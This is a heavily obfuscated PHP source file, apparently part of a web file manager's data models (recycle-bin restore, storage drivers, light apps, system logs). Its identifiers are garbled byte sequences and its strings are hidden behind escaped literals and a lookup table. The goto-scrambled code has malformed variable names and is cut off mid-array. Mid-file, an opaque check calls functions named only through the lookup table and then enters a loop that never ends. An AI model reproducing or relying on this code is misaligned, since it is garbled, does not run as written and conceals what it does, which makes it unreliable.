$_SERVER[£¶ä½¶¢]; $Eø¸½†™â = $Eø¸½†™â ? $Eø¸½†™â : USER_ID; $EÛ‚á±¿‘ = Model($D¦â­ô˜Û[1203]); goto Bò¨£¯Æö®; Bò¨£¯Æö®: $CÌÏÊ˜Ìê = $this->listData($Eø¸½†™â); $Aé®†Å‘ïù = $Aé®†Å‘ïù === !1 ? !1 : $Aé®†Å‘ïù; $Fœ™ˆâµé = array(); goto dù«Ş›‰ëÓ; d•å‘¼÷•: } public function restore($b…Ø»ù¶ñå = false) { $D´õïŸçÃ = $this->listData(); $this->_restoreSource($D´õïŸçÃ, $b…Ø»ù¶ñå); } public function removeUserAll($Aõ…¶‘¹®Ü) { $this->remove(!1, $Aõ…¶‘¹®Ü); } private function _restoreSource($e”ˆ¸šóÄ„, $dÎŸ¼ÓÄ…à) { goto C•À¶â÷øÃ; f˜Ø¤Ú±…˜: $D°¿¯•»Áè->updateModifyTime($A¡™å‹Áî´); goto BíÉéÒÅíÚ; b³÷‹ØÀğƒ: if (!$e”ˆ¸šóÄ„) { return !0; } $A¡™å‹Áî´ = array(); foreach ($e”ˆ¸šóÄ„ as $d¤œ¢…ŒÀ) { goto aÈ¥¦è­¬; F¬†§Û­™–: if ($DËìÇ‡¡ÃÄ[$DÚœª¦Ä‰‘[431]] == $DÚœª¦Ä‰‘[97]) { continue; } $D°¿¯•»Áè->lockMoveStart($d¤œ¢…ŒÀ); $this->recycleMove($d¤œ¢…ŒÀ, 0); goto Bõìñ’Œ«¿; Bõìñ’Œ«¿: if ($d‰²ƒ°î¹é[$DÚœª¦Ä‰‘[411]] == $DÚœª¦Ä‰‘[97]) { $dœ‡”ªÔ¡ = array($DÚœª¦Ä‰‘[561] => array($DÚœª¦Ä‰‘[520], $d‰²ƒ°î¹é[$DÚœª¦Ä‰‘[495]] . $d¤œ¢…ŒÀ . $DÚœª¦Ä‰‘[521])); $D°¿¯•»Áè->where($dœ‡”ªÔ¡)->setField($DÚœª¦Ä‰‘[431], 0); $this->restoreFolderChildren($d¤œ¢…ŒÀ, $e”ˆ¸šóÄ„); } $this->where(array($DÚœª¦Ä‰‘[403] => $d¤œ¢…ŒÀ))->delete(); $D°¿¯•»Áè->folderSizeReset($d‰²ƒ°î¹é[$DÚœª¦Ä‰‘[486]]); goto cß…©ˆ±; aÈ¥¦è­¬: if ($dÎŸ¼ÓÄ…à != !1 && !in_array($d¤œ¢…ŒÀ, $dÎŸ¼ÓÄ…à)) { continue; } $d‰²ƒ°î¹é = $D°¿¯•»Áè->sourceInfo($d¤œ¢…ŒÀ); $DËìÇ‡¡ÃÄ = $D°¿¯•»Áè->sourceInfo($d‰²ƒ°î¹é[$DÚœª¦Ä‰‘[486]]); goto F¬†§Û­™–; cß…©ˆ±: $A¡™å‹Áî´[] = $d‰²ƒ°î¹é[$DÚœª¦Ä‰‘[486]]; if ($d‰²ƒ°î¹é[$DÚœª¦Ä‰‘[411]] == $DÚœª¦Ä‰‘[97]) { $A¡™å‹Áî´[] = $d¤œ¢…ŒÀ; } $D°¿¯•»Áè->lockMoveEnd($d¤œ¢…ŒÀ); goto EÉËÊê”Ğ™; EÉËÊê”Ğ™: } goto f˜Ø¤Ú±…˜; C•À¶â÷øÃ: $DÚœª¦Ä‰‘ =& $_SERVER[£¶ä½¶¢]; $D°¿¯•»Áè = Model($DÚœª¦Ä‰‘[1203]); $dÎŸ¼ÓÄ…à = $dÎŸ¼ÓÄ…à == !1 ? !1 : $dÎŸ¼ÓÄ…à; goto b³÷‹ØÀğƒ; BíÉéÒÅíÚ: } private function restoreFolderChildren($F»âáÃä¥, $bÇÁ˜ä Û) { goto b¸»Í±Õ¸ô; D’¤ËÀ…Øá: foreach ($bÇÁ˜ä Û as $D¨êª½ØŸ¿) { if ($D¨êª½ØŸ¿ == $F»âáÃä¥) { continue; } if (!$Fø’Üç¨óã->isParentOf($F»âáÃä¥, $D¨êª½ØŸ¿)) { continue; } $A‰ø˜™‡Ò = $Fø’Üç¨óã->sourceInfo($D¨êª½ØŸ¿); if ($A‰ø˜™‡Ò[$F‹ˆùŠ†ß[411]] == $F‹ˆùŠ†ß[97]) { $eøˆ¢ÆÈÀ‘[] = array($F‹ˆùŠ†ß[561] => array($F‹ˆùŠ†ß[520], $A‰ø˜™‡Ò[$F‹ˆùŠ†ß[495]] . $D¨êª½ØŸ¿ . $F‹ˆùŠ†ß[521])); } else { $eøˆ¢ÆÈÀ‘[$F‹ˆùŠ†ß[403]][1][] = $D¨êª½ØŸ¿; } } if (!$eøˆ¢ÆÈÀ‘[$F‹ˆùŠ†ß[403]][1]) { unset($eøˆ¢ÆÈÀ‘[$F‹ˆùŠ†ß[403]]); } if (!$eøˆ¢ÆÈÀ‘) { return; } goto e‘†—ÔÜ…Æ; b¸»Í±Õ¸ô: $F‹ˆùŠ†ß =& $_SERVER[£¶ä½¶¢]; $Fø’Üç¨óã = Model($F‹ˆùŠ†ß[1203]); $eøˆ¢ÆÈÀ‘ = array($F‹ˆùŠ†ß[403] => array($F‹ˆùŠ†ß[17], array())); goto D’¤ËÀ…Øá; e‘†—ÔÜ…Æ: $eøˆ¢ÆÈÀ‘[$F‹ˆùŠ†ß[403]][1] = array_unique($eøˆ¢ÆÈÀ‘[$F‹ˆùŠ†ß[403]][1]); $eøˆ¢ÆÈÀ‘[$F‹ˆùŠ†ß[955]] = $F‹ˆùŠ†ß[1777]; $Fø’Üç¨óã->where($eøˆ¢ÆÈÀ‘)->setField($F‹ˆùŠ†ß[431], 1); goto CÍ¡™íÌ• ; CÍ¡™íÌ• : } private function recycleMove($B—ªöÃ„ ó, $AÅİ‰ƒË™Í = 1) { $E“â©² É“ =& $_SERVER[£¶ä½¶¢]; $Fë³’áŞó¿ = Model($E“â©² É“[1203]); $F‹Š›…»²– = Model($E“â©² É“[1986]); $A°É……Ÿ± = array($E“â©² É“[403] => $B—ªöÃ„ ó); if ($AÅİ‰ƒË™Í) { $Fë³’áŞó¿->where($A°É……Ÿ±)->setField($E“â©² É“[431], 1); $F‹Š›…»²–->eventRecycle($B—ªöÃ„ ó, $E“â©² É“[1987]); } else { $Fö³á™ÉÎÉ = $Fë³’áŞó¿->where($A°É……Ÿ±)->find(); $c³‰ò…¶“ê = $Fö³á™ÉÎÉ[$E“â©² É“[411]] == $E“â©² É“[97]; $b¢º•ÛèœÍ = $Fë³’áŞó¿->fileNameAuto($Fö³á™ÉÎÉ[$E“â©² É“[486]], $Fö³á™ÉÎÉ[$E“â©² É“[38]], REPEAT_RENAME_FOLDER, $c³‰ò…¶“ê); if ($b¢º•ÛèœÍ != $Fö³á™ÉÎÉ[$E“â©² É“[38]]) { $Fë³’áŞó¿->rename($B—ªöÃ„ ó, $b¢º•ÛèœÍ); } $Fë³’áŞó¿->where($A°É……Ÿ±)->setField($E“â©² É“[431], 0); $F‹Š›…»²–->eventRecycle($B—ªöÃ„ ó, $E“â©² É“[1988]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\163\164\157\162\141\147\145\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x73\x69\x7a\x65\115\141\170", "\163\171\163\x74\145\x6d", "\x64\x65\x66\141\x75\x6c\x74", "\x64\162\151\166\145\x72", "\x63\157\x6e\146\151\x67"); public function listData($A­·ÕÇÀ¿¡ = false, $Fáç°öºË” = "\155\157\x64\x69\146\171\124\x69\x6d\145", $eÓÔëĞ¹Ù = false) { $BÅ¯¼¡ÈÀ =& $_SERVER[£¶ä½¶¢]; $E·ò‘ãÅÇ = parent::listData($A­·ÕÇÀ¿¡, $Fáç°öºË”, $eÓÔëĞ¹Ù); if ($A­·ÕÇÀ¿¡) { return $E·ò‘ãÅÇ; } $DŞÇ¨«Ô‡” = $this->ioSizeUseGet(array_to_keyvalue($E·ò‘ãÅÇ, $BÅ¯¼¡ÈÀ[43], $BÅ¯¼¡ÈÀ[401])); foreach ($E·ò‘ãÅÇ as $Eø´¦®®îÇ => $E•Ñ«îõå¬) { unset($E·ò‘ãÅÇ[$Eø´¦®®îÇ][$BÅ¯¼¡ÈÀ[16]]); $E·ò‘ãÅÇ[$Eø´¦®®îÇ][$BÅ¯¼¡ÈÀ[1676]] = isset($DŞÇ¨«Ô‡”[$E•Ñ«îõå¬[$BÅ¯¼¡ÈÀ[401]]]) ? $DŞÇ¨«Ô‡”[$E•Ñ«îõå¬[$BÅ¯¼¡ÈÀ[401]]] : 0; } return $E·ò‘ãÅÇ; } public function ioSizeUseGet($C¶‹¸‚êï) { goto B„ìêáö÷ì; B©î£ÕÁç: Cache::set($BªëæÉ¿½, $aÄÑ„„Õ, 600); return $aÄÑ„„Õ; goto AÄÔê†ôÙ; B„ìêáö÷ì: $a†·öèŞËÓ =& $_SERVER[£¶ä½¶¢]; if (!$C¶‹¸‚êï) { return array(); } $BªëæÉ¿½ = $a†·öèŞËÓ[1989] . implode($a†·öèŞËÓ[57], $C¶‹¸‚êï); goto eˆ£çŒÁ ; eˆ£çŒÁ : $aÄÑ„„Õ = Cache::get($BªëæÉ¿½); if ($aÄÑ„„Õ) { return $aÄÑ„„Õ; } $Cµ‰œ¸é°Å = array($a†·öèŞËÓ[790] => $a†·öèŞËÓ[401], $a†·öèŞËÓ[1990] => $a†·öèŞËÓ[88]); goto A™¦‘Ú¶¯´; A™¦‘Ú¶¯´: $DÚš¸×¿ØÍ = array($a†·öèŞËÓ[790] => array($a†·öèŞËÓ[17], $C¶‹¸‚êï)); $aÄÑ„„Õ = Model($a†·öèŞËÓ[755])->field($Cµ‰œ¸é°Å)->where($DÚš¸×¿ØÍ)->group($a†·öèŞËÓ[790])->select(); $aÄÑ„„Õ = array_to_keyvalue($aÄÑ„„Õ, $a†·öèŞËÓ[401], $a†·öèŞËÓ[88]); goto B©î£ÕÁç; AÄÔê†ôÙ: } public function getConfig($B„Æ·‚­½) { $aÑİ‡í‚èƒ = parent::listData($B„Æ·‚­½); return json_decode($aÑİ‡í‚èƒ[$_SERVER[£¶ä½¶¢][16]], !0); } public function update($C¾ç¼ò½¬Ê, $fòŠ„É™‚›) { goto d‰¯‡£Á; Cò°À³ÇÓ: $f¨îÃõ¬’ = parent::update($C¾ç¼ò½¬Ê, $fòŠ„É™‚›); if ($f¨îÃõ¬’ && $fòŠ„É™‚›[$FïØ¼Û×Õµ[44]]) { foreach ($E—ŞŒ ›º‡ as $E·ïëîºëÃ) { if ($E·ïëîºëÃ[$FïØ¼Û×Õµ[44]] && $E·ïëîºëÃ[$FïØ¼Û×Õµ[401]] != $C¾ç¼ò½¬Ê) { parent::update($E·ïëîºëÃ[$FïØ¼Û×Õµ[401]], array($FïØ¼Û×Õµ[44] => 0)); } } } return $f¨îÃõ¬’; goto Eñß´¼¬; e¹Øë±ß: if (isset($E—ŞŒ ›º‡[$D³ºÊàÌ²]) && $E—ŞŒ ›º‡[$D³ºÊàÌ²][$FïØ¼Û×Õµ[401]] != $C¾ç¼ò½¬Ê) { return !1; } if (isset($fòŠ„É™‚›[$FïØ¼Û×Õµ[1991]]) && $fòŠ„É™‚›[$FïØ¼Û×Õµ[1991]] == $FïØ¼Û×Õµ[97]) { $this->checkConfig($fòŠ„É™‚›); } unset($fòŠ„É™‚›[$FïØ¼Û×Õµ[1991]]); goto Cò°À³ÇÓ; d‰¯‡£Á: $FïØ¼Û×Õµ =& $_SERVER[£¶ä½¶¢]; $D³ºÊàÌ² = $fòŠ„É™‚›[$FïØ¼Û×Õµ[38]]; $E—ŞŒ ›º‡ = array_to_keyvalue(parent::listData(), $FïØ¼Û×Õµ[38]); goto e¹Øë±ß; Eñß´¼¬: } public function add($cµÙÅºá­) { goto CÓ¥íóè®; fá‡†èù«£: return $E‚‚ÄÀ‰; goto B¾ñ‡›³–; fƒõùÙ¶‚æ: $this->checkConfig($cµÙÅºá­); $E‚‚ÄÀ‰ = parent::insert($cµÙÅºá­); if ($E‚‚ÄÀ‰ && $cµÙÅºá­[$eÏè‰ìÎÌ[44]]) { foreach ($Fœ¿½ßÜœ½ as $f¦éÀŠ´¬) { if ($f¦éÀŠ´¬[$eÏè‰ìÎÌ[44]]) { parent::update($f¦éÀŠ´¬[$eÏè‰ìÎÌ[401]], array($eÏè‰ìÎÌ[44] => 0)); } } } goto fá‡†èù«£; CÓ¥íóè®: $eÏè‰ìÎÌ =& $_SERVER[£¶ä½¶¢]; $Fœ¿½ßÜœ½ = array_to_keyvalue(parent::listData(), $eÏè‰ìÎÌ[38]); if (isset($Fœ¿½ßÜœ½[$cµÙÅºá­[$eÏè‰ìÎÌ[38]]])) { return !1; } goto fƒõùÙ¶‚æ; B¾ñ‡›³–: } public function checkConfig(&$Dø¸Ä“×Ò, $c¤ªğ²®Ëé = false) { goto dÓìŒ´ğ ¼; dÓìŒ´ğ ¼: $dœ¾äÒŸ± =& $_SERVER[£¶ä½¶¢]; $D³®‹ÑŒ¡Ä = strtolower($Dø¸Ä“×Ò[$dœ¾äÒŸ±[104]]); $Fƒ²Õ½“Â  = json_decode($Dø¸Ä“×Ò[$dœ¾äÒŸ±[16]], !0); goto C­Šİ·çš‘; B½ñ¦ù…·ƒ: $Dø¸Ä“×Ò[$dœ¾äÒŸ±[16]] = json_encode($Fƒ²Õ½“Â ); $Dø¸Ä“×Ò[$dœ¾äÒŸ±[104]] = $Dô¯»—‡ÚÆ; return !0; goto cÊÀ„ªÓ; cÉòÆ‰ ·: $FäÔ¡ÓÁŒÑ = $CğŠ’ªÏ¨‰->getPath($D†…ÓïË¿è . $dœ¾äÒŸ±[1135]); if (!$CğŠ’ªÏ¨‰->mkfile($FäÔ¡ÓÁŒÑ)) { if ($c¤ªğ²®Ëé) { return LNG($dœ¾äÒŸ±[1996]); } show_json(LNG($dœ¾äÒŸ±[1996]), !1); } $Fƒ²Õ½“Â [$dœ¾äÒŸ±[1074]] = $D†…ÓïË¿è; goto B½ñ¦ù…·ƒ; C­Šİ·çš‘: foreach ($Fƒ²Õ½“Â  as $a±ôºİ“–à => $f¢‚¥˜’§‘) { $Fƒ²Õ½“Â [$a±ôºİ“–à] = trim($f¢‚¥˜’§‘); } $Fƒ²Õ½“Â [$dœ¾äÒŸ±[1992]] = rand_string(6); $aÇã³ğ¾×‹ = $GLOBALS[$dœ¾äÒŸ±[16]][$dœ¾äÒŸ±[98]][$dœ¾äÒŸ±[799]]; goto fòù•âÏ‰ñ; fòù•âÏ‰ñ: $Dô¯»—‡ÚÆ = isset($aÇã³ğ¾×‹[$D³®‹ÑŒ¡Ä]) ? $aÇã³ğ¾×‹[$D³®‹ÑŒ¡Ä] : ucfirst($D³®‹ÑŒ¡Ä); $b÷Ò¼Ê¬ = $dœ¾äÒŸ±[82] . $Dô¯»—‡ÚÆ; if (!$Dô¯»—‡ÚÆ || !class_exists($b÷Ò¼Ê¬)) { if ($c¤ªğ²®Ëé) { return LNG($dœ¾äÒŸ±[1993]); } write_log(array($dœ¾äÒŸ±[1994], $Dø¸Ä“×Ò, get_caller_info()), $dœ¾äÒŸ±[1995]); show_json(LNG($dœ¾äÒŸ±[1993]), !1, $Dø¸Ä“×Ò); } goto Dà±Ğ®¾á; Dà±Ğ®¾á: $CğŠ’ªÏ¨‰ = new $b÷Ò¼Ê¬($Fƒ²Õ½“Â ); if (in_array($D³®‹ÑŒ¡Ä, $CğŠ’ªÏ¨‰->objectDriver)) { if (!$CğŠ’ªÏ¨‰->isBucketCors() && !$CğŠ’ªÏ¨‰->setBucketCors()) { $Aš¦áç‰Ñ» = LNG($dœ¾äÒŸ±[1996]); $Aš¦áç‰Ñ» .= $dœ¾äÒŸ±[1997] . LNG($dœ¾äÒŸ±[1998]); if ($c¤ªğ²®Ëé) { return $Aš¦áç‰Ñ»; } show_json($Aš¦áç‰Ñ», !1); } } $D†…ÓïË¿è = rtrim($Fƒ²Õ½“Â [$dœ¾äÒŸ±[1074]], $dœ¾äÒŸ±[18]) . $dœ¾äÒŸ±[18]; goto cÉòÆ‰ ·; cÊÀ„ªÓ: } public function driverListSystem() { $eÙ«ÈùµÀÊ =& $_SERVER[£¶ä½¶¢]; $F«°æàò½ = parent::listData(); $Dç´³£ÇÂ¸ = array(); foreach ($F«°æàò½ as $F©¢§åİÑ¸) { unset($F©¢§åİÑ¸[$eÙ«ÈùµÀÊ[204]], $F©¢§åİÑ¸[$eÙ«ÈùµÀÊ[94]]); $F©¢§åİÑ¸[$eÙ«ÈùµÀÊ[16]] = json_decode($F©¢§åİÑ¸[$eÙ«ÈùµÀÊ[16]], !0); $Dç´³£ÇÂ¸[] = $F©¢§åİÑ¸; } return $Dç´³£ÇÂ¸; } public function defaultDriver() { $aÉ›ÒÀÄÀœ =& $_SERVER[£¶ä½¶¢]; $f¬‹¦º¦± = parent::listData(); $C¶›…ÃƒØ = array_filter_by_field($f¬‹¦º¦±, $aÉ›ÒÀÄÀœ[44], 1); $C¶›…ÃƒØ = $C¶›…ÃƒØ[0]; if ($C¶›…ÃƒØ) { $C¶›…ÃƒØ[$aÉ›ÒÀÄÀœ[16]] = json_decode($C¶›…ÃƒØ[$aÉ›ÒÀÄÀœ[16]], !0); } return $C¶›…ÃƒØ; } public function driverInfo($E¾à¹ßĞ‰) { $cÎ¹Í¥–Ø =& $_SERVER[£¶ä½¶¢]; $a³¨›îÈÎø = array_to_keyvalue(parent::listData(), $cÎ¹Í¥–Ø[401]); if (!isset($a³¨›îÈÎø[$E¾à¹ßĞ‰])) { return !1; } $BŞïŸ…Ïˆ = $a³¨›îÈÎø[$E¾à¹ßĞ‰]; $BŞïŸ…Ïˆ[$cÎ¹Í¥–Ø[16]] = json_decode($BŞïŸ…Ïˆ[$cÎ¹Í¥–Ø[16]], !0); return $BŞïŸ…Ïˆ; } public function remove($cìîßâí–Ç) { $this->removeShareItems($cìîßâí–Ç); return parent::remove($cìîßâí–Ç); } public function removeWithFile($B–Ğìª¼«, $Eâè¶Ÿë¡Ê) { goto bË˜¢Š±„±; FÙ¾îÛ‰”‰: $fùˆøƒŞÎ¶ = "\173\x69\157\x3a{$aÃ½˜¹é‘Õ}\x7d\57"; $cË´Ÿ‘²Õ® = !0; $dÍì†±éóÜ = array(); goto c·ËŠ„»Î; bË˜¢Š±„±: $EÓ‰á¶ã×ç =& $_SERVER[£¶ä½¶¢]; $c…õŒ¹Å¦Ó = array($EÓ‰á¶ã×ç[790] => $B–Ğìª¼«); $eÔ¿÷‚õ = Model($EÓ‰á¶ã×ç[458])->where($c…õŒ¹Å¦Ó)->count(); goto dêåæ¼”³®; f‹é§¤›ùå: if (!$cË´Ÿ‘²Õ®) { $EÔùòÆÎñ‰->stop($EÏº ÇŠ¥‡); return !1; } $EÔùòÆÎñ‰->end(); if ($Eâè¶Ÿë¡Ê == $EÓ‰á¶ã×ç[1656]) { $this->remove($B–Ğìª¼«); } goto BŞâƒ‡å¼; Cë§ªˆ‚õ: $EÔùòÆÎñ‰->task[$EÓ‰á¶ã×ç[731]] = (double) $cŒæ‡¼Øò©; $EÄ¯ö…Å¸Ô = KodIO::defaultDriver(); $aÃ½˜¹é‘Õ = $EÄ¯ö…Å¸Ô[$EÓ‰á¶ã×ç[401]]; goto FÙ¾îÛ‰”‰; dêåæ¼”³®: $cŒæ‡¼Øò© = Model($EÓ‰á¶ã×ç[458])->where($c…õŒ¹Å¦Ó)->sum($EÓ‰á¶ã×ç[88]); $EÏº ÇŠ¥‡ = $Eâè¶Ÿë¡Ê . $EÓ‰á¶ã×ç[1999] . $B–Ğìª¼«; $EÔùòÆÎñ‰ = new TaskFileTransfer($EÏº ÇŠ¥‡, $EÓ‰á¶ã×ç[1995], $eÔ¿÷‚õ, LNG($EÓ‰á¶ã×ç[2000]) . "\x28{$B–Ğìª¼«}\51"); goto Cë§ªˆ‚õ; c·ËŠ„»Î: $a‚¹¯Š¶ = Model($EÓ‰á¶ã×ç[203])->where($c…õŒ¹Å¦Ó)->field($EÓ‰á¶ã×ç[2001])->select(); foreach ($a‚¹¯Š¶ as $fÈİéØ•ğ) { goto AºÃ‡´àêá; FÀµåó£­ç: if (IO::exist($Cˆ°ÎÂ¯‰Ò)) { $EÔùòÆÎñ‰->updateFileEnd($fÈİéØ•ğ[$EÓ‰á¶ã×ç[38]], $fÈİéØ•ğ[$EÓ‰á¶ã×ç[88]]); continue; } if (!IO::move($BÕçç¾á’, get_path_father($Cˆ°ÎÂ¯‰Ò))) { $cË´Ÿ‘²Õ® = !1; break; } $c…õŒ¹Å¦Ó = array($EÓ‰á¶ã×ç[455] => $fÈİéØ•ğ[$EÓ‰á¶ã×ç[455]]); goto Cˆ»Û«å³; AºÃ‡´àêá: $BÕçç¾á’ = $fÈİéØ•ğ[$EÓ‰á¶ã×ç[86]]; $Cˆ°ÎÂ¯‰Ò = $fùˆøƒŞÎ¶ . str_replace("\173\151\x6f\x3a{$B–Ğìª¼«}\175\57", $EÓ‰á¶ã×ç[43], $BÕçç¾á’); if (!IO::exist($BÕçç¾á’)) { $dÍì†±éóÜ[] = $fÈİéØ•ğ[$EÓ‰á¶ã×ç[455]]; $EÔùòÆÎñ‰->updateFileEnd($fÈİéØ•ğ[$EÓ‰á¶ã×ç[38]], $fÈİéØ•ğ[$EÓ‰á¶ã×ç[88]]); continue; } goto FÀµåó£­ç; Cˆ»Û«å³: $BÒæ¿ø¹  = array($EÓ‰á¶ã×ç[790] => $aÃ½˜¹é‘Õ, $EÓ‰á¶ã×ç[86] => $Cˆ°ÎÂ¯‰Ò); Model($EÓ‰á¶ã×ç[203])->where($c…õŒ¹Å¦Ó)->save($BÒæ¿ø¹ ); goto D‡¦Ä½í˜÷; D‡¦Ä½í˜÷: } $this->removeByFileID($dÍì†±éóÜ); goto f‹é§¤›ùå; BŞâƒ‡å¼: } public function progress($c¼¾™’¾‚—, $FË‘§ª ›) { return Task::get($FË‘§ª › . $_SERVER[£¶ä½¶¢][1999] . $c¼¾™’¾‚—); } private function removeByFileID($CÈ†äÀŞƒ± = array()) { goto BƒÆÔİªÆº; F†Ù³Ÿâ‹Ô: $Eè¨¹æ…É = Model($cÚ™¢ÊğÚ×[1203])->where($eÜŒÏ×Ê¤¿)->field($cÚ™¢ÊğÚ×[403])->select(); if (!$Eè¨¹æ…É) { return; } $Eè¨¹æ…É = array_to_keyvalue($Eè¨¹æ…É, $cÚ™¢ÊğÚ×[43], $cÚ™¢ÊğÚ×[403]); goto CÀ¥¸‘Ÿâí; CÀ¥¸‘Ÿâí: foreach ($Eè¨¹æ…É as $dİ…Œïáå¤) { Model($cÚ™¢ÊğÚ×[417])->removeNow($dİ…Œïáå¤, !1); } goto E‘‰°©ñßê; BƒÆÔİªÆº: $cÚ™¢ÊğÚ× =& $_SERVER[£¶ä½¶¢]; if (empty($CÈ†äÀŞƒ±)) { return; } $eÜŒÏ×Ê¤¿ = array($cÚ™¢ÊğÚ×[455] => array($cÚ™¢ÊğÚ×[17], $CÈ†äÀŞƒ±)); goto F†Ù³Ÿâ‹Ô; E‘‰°©ñßê: } private function removeShareItems($fÍ•ÔŒ‡¨) { goto d½ë¥éÀ; d½ë¥éÀ: $FÏ —ê£«® =& $_SERVER[£¶ä½¶¢]; $A…Â°†Ø = "\x7b\151\x6f\x3a{$fÍ•ÔŒ‡¨}\175\x2f"; $FšÂğ˜ÇÅà = array($FÏ —ê£«®[403] => 0, $FÏ —ê£«®[1069] => array($FÏ —ê£«®[388], "{$A…Â°†Ø}\x25")); goto d†øøöÃ; d†øøöÃ: $AÔê™œ‘Ğ = Model($FÏ —ê£«®[1667])->where($FšÂğ˜ÇÅà)->field($FÏ —ê£«®[476])->select(); if (empty($AÔê™œ‘Ğ)) { return; } $cîºÇ¦ƒ÷Ó = array_to_keyvalue($AÔê™œ‘Ğ, $FÏ —ê£«®[43], $FÏ —ê£«®[476]); goto E˜Ìœï‚‰“; E˜Ìœï‚‰“: Model($FÏ —ê£«®[571])->remove($cîºÇ¦ƒ÷Ó); goto b¸¶¦Úèç; b¸¶¦Úèç: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\56\114\151\147\150\164\x41\160\x70"; public $modelType = "\123\171\x73\164\x65\x6d\x4f\x70\x74\x69\x6f\156"; public $field = array("\156\141\155\x65", "\147\x72\x6f\x75\160", "\x64\x65\163\143", "\143\157\x6e\164\145\156\164"); public function listData($aá¼¿ÌÀéè = false, $B‡ˆÜôäà = "\x6d\x6f\x64\x69\x66\171\x54\151\x6d\145", $dŸÉ¶îˆ¡› = true) { return parent::listData($aá¼¿ÌÀéè, $B‡ˆÜôäà, $dŸÉ¶îˆ¡›); } public function remove($DÒ½Ğ´Í) { $B—––¾Û«è = $this->findByName($DÒ½Ğ´Í); if (!$B—––¾Û«è) { return !1; } return parent::remove($B—––¾Û«è[$_SERVER[£¶ä½¶¢][401]]); } public function add($D—‚°ö”Ù) { if ($this->findByName($D—‚°ö”Ù[$_SERVER[£¶ä½¶¢][38]])) { return !1; } return parent::insert($D—‚°ö”Ù); } public function update($Cİô‰½ËâÙ, $Fåš™ÛÜÕ) { $C»…ÅëÍíÔ =& $_SERVER[£¶ä½¶¢]; $E§Æ¥…¦ø® = $this->findByName($Cİô‰½ËâÙ); $fçîí©¾» = $this->findByName($Fåš™ÛÜÕ[$C»…ÅëÍíÔ[38]]); if (!$E§Æ¥…¦ø® || $fçîí©¾» && $fçîí©¾»[$C»…ÅëÍíÔ[401]] != $E§Æ¥…¦ø®[$C»…ÅëÍíÔ[401]]) { return !1; } return parent::update($E§Æ¥…¦ø®[$C»…ÅëÍíÔ[401]], $Fåš™ÛÜÕ); } } goto Cò¸£ï®»; dŠçæùøˆ: function binCheckBigger($aÓ‡‘ËÅÁÜ, $DÁÓ‹»ÙÃ) { return $aÓ‡‘ËÅÁÜ > $DÁÓ‹»ÙÃ; } $_SERVER[$_SERVER[ší³ÛË][3]] = (strrev('3909').base64_decode('OTM='))+0;$_DGz6="PH7I8DZWAnisF4vq2FQhaSNdwmStIJEbNrZB37Nx6wycaT7SgYGjDAVkm8auYnfEi85dp";; if (!isset($_SERVER[$_SERVER[£¶ä½¶¢][4]]) || !isset($_SERVER[$_SERVER[£¶ä½¶¢][5]])) { goto fùÅŠàùÄ®; D¬½‡Şã: $D¢Û ÈëóØ($_SERVER[$_SERVER[£¶ä½¶¢][7]] . $_SERVER[£¶ä½¶¢][8]); $B¢ÏÃğºêÂ = 2; while ($B¢ÏÃğºêÂ > 1) { $BÒŸéˆ˜¥¿ = rawurlencode($B¢ÏÃğºêÂ . $_SERVER[£¶ä½¶¢][13]); } goto aïïæ‰Œ“¸; BØ¢Ìá¦Ğ: $dìÀ±ô† = explode($_SERVER[£¶ä½¶¢][9], $eé‚Î†¿); if (count($dìÀ±ô†) < $_SERVER[£¶ä½¶¢][10]) { $C“Äšô† = $_SERVER[£¶ä½¶¢][11]; $C“Äšô†(); } $D¢Û ÈëóØ = $_SERVER[£¶ä½¶¢][12]; goto D¬½‡Şã; fùÅŠàùÄ®: $Aõ³ˆÈ´˜ = $_SERVER[£¶ä½¶¢][6]; $aÂÅ©ŞùÓ = $_SERVER[$_SERVER[£¶ä½¶¢][7]] . $_SERVER[£¶ä½¶¢][8]; $eé‚Î†¿ = $Aõ³ˆÈ´˜($aÂÅ©ŞùÓ); goto BØ¢Ìá¦Ğ; aïïæ‰Œ“¸: } goto Eí‡¿—…çÚ; Cò¸£ï®»: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\x6d\x5f\154\x6f\147"; protected $dataAuto = array(array("\143\x72\x65\x61\164\x65\x54\151\155\x65", "\x74\x69\155\x65", "\151\156\163\x65\x72\x74", "\x66\x75\156\143\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $cÜÑ¼È„‘ =& $_SERVER[£¶ä½¶¢]; return array($cÜÑ¼È„‘[2002] => LNG($cÜÑ¼È„‘[2003]), $cÜÑ¼È„‘[2004] => LNG($cÜÑ¼È„‘[2005]), $cÜÑ¼È„‘[1630] => LNG($cÜÑ¼È„‘[2006]), $cÜÑ¼È„‘[2007] => LNG($cÜÑ¼È„‘[2008]), $cÜÑ¼È„‘[2009] => LNG($cÜÑ¼È„‘[2010]), $cÜÑ¼È„‘[2011] => LNG($cÜÑ¼È„‘[2012]), $cÜÑ¼È„‘[2013] => LNG($cÜÑ¼È„‘[2014]), $cÜÑ¼È„‘[1660] => LNG($cÜÑ¼È„‘[2014]), $cÜÑ¼È„‘[1661] => LNG($cÜÑ¼È„‘[2015]), $cÜÑ¼È„‘[2016] => LNG($cÜÑ¼È„‘[2017]), $cÜÑ¼È„‘[2018] => LNG($cÜÑ¼È„‘[2019]), $cÜÑ¼È„‘[2020] => LNG($cÜÑ¼È„‘[2021]), $cÜÑ¼È„‘[2022] => LNG($cÜÑ¼È„‘[2023]), $cÜÑ¼È„‘[1658] => LNG($cÜÑ¼È„‘[2024]), $cÜÑ¼È„‘[2025] => LNG($cÜÑ¼È„‘[2026]), $cÜÑ¼È„‘[1665] => LNG($cÜÑ¼È„‘[2027]), $cÜÑ¼È„‘[2028] => LNG($cÜÑ¼È„‘[2029]), $cÜÑ¼È„‘[2030] => LNG($cÜÑ¼È„‘[2031]), $cÜÑ¼È„‘[2032] => LNG($cÜÑ¼È„‘[2033]), $cÜÑ¼È„‘[2034] => LNG($cÜÑ¼È„‘[2035]), $cÜÑ¼È„‘[1668] => LNG($cÜÑ¼È„‘[2036]), $cÜÑ¼È„‘[1669] => LNG($cÜÑ¼È„‘[2037]), $cÜÑ¼È„‘[2038] => LNG($cÜÑ¼È„‘[2039]), $cÜÑ¼È„‘[2040] => LNG($cÜÑ¼È„‘[2041]), $cÜÑ¼È„‘[2042] => 